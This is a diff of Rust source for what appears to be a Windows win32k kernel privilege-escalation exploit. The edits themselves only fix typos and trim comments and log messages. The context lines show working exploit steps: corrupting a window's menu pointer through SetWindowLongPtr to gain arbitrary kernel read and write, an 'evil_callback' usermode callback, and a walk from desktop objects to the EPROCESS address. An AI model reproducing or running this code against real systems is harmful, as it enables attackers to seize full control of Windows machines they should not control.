@@ -198,7 +198,7 @@ fn main() {
         ntuserconsolecontrol(6, pevilhwnd, 0x10);
         return;
     }
-    println!("[+]Got arbitrary write primitive");
+    println!("[+]Got arbitrary write primitive!");
     println!(">Trying arbitrary read primitive through corrupted tagMENU structure");
     //unsafe fn arbitrary_read_test(hwnd0offset: usize, hwnd1offset: usize, 
     //menuaddr: usize, tagwnd1addr: usize, hwnd0: HWND, hwnd1: HWND, 
@@ -471,7 +471,7 @@ unsafe fn arbitrary_read_write(hwnd1offset: usize,
     let someflagindex: i32 = ((hwnd1offset + 0x1a) - 0x20) as i32;
     println!(">Setting menu pointer of corrupted hwnd to fake allocation");
     SetLastError(0);
-    //set menubarinfo pointer of fake menu to arbitrary adddress
+    //set menubarinfo pointer of fake menu to arbitrary address
     //setwindowlongptra returns the previous longlong which has the nice
     //benefit of giving us the kernel address of a desktop allocation
     let pmenu: usize = setwindowlongptra(hwnd1, GWLP_ID, fakepmenu.as_ptr() as usize);
@@ -502,10 +502,10 @@ unsafe fn arbitrary_read_write(hwnd1offset: usize,
         return 1
     }
     let newrect: RECT = RECT{ left: 0, top: 0, right: 0, bottom: 0 };
-    //you can try getmenuitemrect too, it's maybe just a little more math
+    //you can try getmenuitemrect too
     //let rekt: *const RECT = &newrect as *const RECT;
     //let pnewrect = rekt as *mut RECT;
-    //GetMenuItemRect(hwnd0, menuhandle, 0, pnewrect);
+    //GetMenuItemRect(hwnd1, menuhandle, 0, pnewrect);
     //let ldw: u32 = newrect.right - newrect.left;
     //let hdw: u32 = newrect.bottom - newrect.top;
     //let qwresult: u64 = ((hdw as u64) << 0x20) + (ldw as u64);
@@ -525,7 +525,7 @@ unsafe fn arbitrary_read_write(hwnd1offset: usize,
         setwindowlongptra(hwnd0, nindex, tagwnd1style);
         return 1
     }
-    println!("[+]Got arbitrary read primitive! Now we're cooking with fire");
+    println!("[+]Got arbitrary read primitive!");
     //it's just convenient that win32 desktop objects have a pointer to the
     //thread object info structure, which has a pointer to the kernel EPROCESS
     //EPROCESS address is at *(*pMenu->ParentWND+0x10)+0x1a0
@@ -652,7 +652,6 @@ unsafe fn cleanup1(consoleoffset0: usize, hwnd0: HWND, tagwnd0offset: usize,
 extern "stdcall" fn evil_callback(cbwndextrasize: *const u32) {
     println!("[+]Inside Callback");
     //we want to pass a lot of state back and forth to the client process
-    //even though windows doesn't want us doing that.
     let pntcallback = NTCALLBACKRETN.read().unwrap();
     let pntconsole = NTCONCSOLECTRL.read().unwrap();
     let ghwnd = GLOBALHWND.read().unwrap();
@@ -686,7 +685,7 @@ extern "stdcall" fn evil_callback(cbwndextrasize: *const u32) {
         let nexthwnd: isize = tableindex | objecthandle << 0x10;
         let mut consolehwnd: HWND = HWND(nexthwnd);
         let pconsolehwnd: usize = (&mut consolehwnd as *const HWND) as usize;
-        //get the addres to calculate its offset
+        //get the address to calculate its offset
         let consoletagwnd: *mut usize = hmvalidatehandle(consolehwnd, 1);
         if (consoletagwnd as usize) == 0 {
             println!("[-]Couldn't find HWND. Exiting gracefully. Try again and it should work");
